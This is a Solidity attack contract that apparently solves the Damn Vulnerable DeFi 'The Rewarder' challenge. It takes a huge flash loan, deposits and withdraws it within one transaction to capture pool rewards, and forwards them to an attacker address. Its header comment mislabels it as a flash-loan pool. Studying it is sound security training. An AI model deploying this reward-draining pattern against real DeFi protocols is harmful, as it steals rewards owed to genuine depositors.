// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

/**
 * @title RewarderAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract RAttacker {

    using Address for address;

    address public rwt;
    address public dvt;
    address public flashLoanPool;
    address public rewarderPool;
    address public pwner;

    constructor(address _rwt, address _dvt, address _flashLoanPool, address _rewarderPool, address _pwner) {
        rwt = _rwt;
        dvt = _dvt;
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;
        pwner = _pwner;
    }

    function pwn() external {
      FlashLoanerPool(flashLoanPool).flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 _amount) external {
      DamnValuableToken(dvt).approve(rewarderPool, _amount);
      TheRewarderPool(rewarderPool).deposit(_amount);
      TheRewarderPool(rewarderPool).withdraw(_amount);
      RewardToken(rwt).transfer(pwner, RewardToken(rwt).balanceOf(address(this)));
      DamnValuableToken(dvt).transfer(flashLoanPool, _amount);
    }
}